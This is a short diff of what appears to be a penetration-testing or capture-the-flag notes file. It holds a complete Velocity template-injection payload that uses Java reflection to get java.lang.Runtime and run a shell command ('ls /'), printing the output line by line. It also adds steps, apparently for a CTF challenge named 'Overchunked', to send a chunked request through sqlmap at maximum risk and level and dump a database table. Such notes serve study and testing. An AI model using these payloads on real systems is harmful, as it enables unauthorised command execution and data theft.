@@ -37,3 +37,9 @@ $ex.waitFor()
 #end
 
 text=text=#set($str = "") #set($runtime = $str.getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null)) #set($listFilesCmd = "ls /") #set($process = $runtime.exec($listFilesCmd)) #set($scanner = $str.getClass().forName("java.util.Scanner").getConstructor($str.getClass().forName("java.io.InputStream")).newInstance($process.getInputStream())) #set($files = "") #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file #set($file = $scanner.nextLine()) $file
+
+
+0xBOverchunked:
+    create a text file with Transfer-Encoding: chunked
+    take a repeater request and insert all to a text file,and add Transfer-Encoding: chunked
+    sqlmap -r <Filename> --risk=3 --level=5 --dbms=sqlite --ignore-code=500 --dump -T posts --threads 10
